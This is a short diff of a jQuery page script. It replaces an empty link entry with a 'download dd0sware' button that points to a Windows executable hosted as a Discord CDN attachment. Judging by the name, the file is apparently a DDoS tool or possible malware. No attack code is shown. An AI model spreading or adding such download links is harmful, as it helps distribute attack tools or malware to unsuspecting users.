@@ -38,8 +38,8 @@ const mobileAndTabletCheck = () => /Android|webOS|iPhone|iPad|iPod|BlackBerry|IE
 $(document).ready(() => {
   const links = [
     {
-      name: 'dd0sware.tk',
-      link: '',
+      name: 'download dd0sware',
+      link: 'https://cdn.discordapp.com/attachments/681160389546868805/784692910582530048/dd0sware.exe',
     },
   ];
 
